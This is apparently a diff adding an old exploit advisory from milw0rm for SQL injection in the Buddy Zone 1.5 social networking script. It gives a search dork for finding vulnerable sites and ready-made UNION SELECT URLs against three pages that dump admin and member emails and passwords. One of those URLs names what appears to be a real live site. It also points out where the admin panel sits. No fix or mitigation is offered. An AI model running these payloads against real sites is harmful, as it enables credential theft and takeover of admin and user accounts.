@@ -1,0 +1,40 @@
+--==+================================================================================+==--
+--==+             Buddy Zone Version 1.5 And Prior SQL Injection Vulnerability       +==--
+--==+================================================================================+==--
+
+
+
+AUTHOR: t0pP8uZz & xprog
+SITE: http://www.vastal.com/buddy-zone-social-networking-script.html
+DORK: allintext:"Powered By Buddy Zone"
+
+
+DESCRIPTION:
+Remote sql injection in view_sub_cat.php cat_id, able to pull username/passwords of their admin and user accounts.
+
+
+EXPLOITS:
+view_news.php
+http://www.site.com/view_news.php?news_id=-1/**/UNION/**/ALL/**/SELECT/**/1,concat(admin_user,0x3a,admin_password),3,4,5,6/**/FROM/**/admin_users/*
+http://www.site.com/view_news.php?news_id=-1/**/UNION/**/ALL/**/SELECT/**/1,concat(member_email,0x3a,member_password),3,4,5,6/**/FROM/**/members/*
+
+view_events.php
+http://www.site.com/view_events.php?cat_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(member_email,0x3a,member_password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/**/FROM/**/members/*
+http://www.divineartists.com/view_events.php?cat_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(admin_user,0x3a,admin_password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/**/FROM/**/admin_users/*
+
+video_gallery.php
+http://www.site.com/video_gallery.php?member_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,concat(admin_user,0x3a,admin_password),7,8,9,10,11,12,13,14,15,16,17,18,19,20/**/FROM/**/admin_users/*
+http://www.site.com/video_gallery.php?member_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,concat(member_email,0x3a,member_password),7,8,9,10,11,12,13,14,15,16,17,18,19,20/**/FROM/**/members/*
+
+
+Tip/Note:
+The Administrator's Panel is in /admin/.
+
+GREETZ: milw0rm.com, H4CKY0u.org, G0t-Root.net, and the ASFC/FM4 peeps !
+
+
+--==+================================================================================+==--
+--==+             Buddy Zone Version 1.5 And Prior SQL Injection Vulnerability       +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2007-06-30]
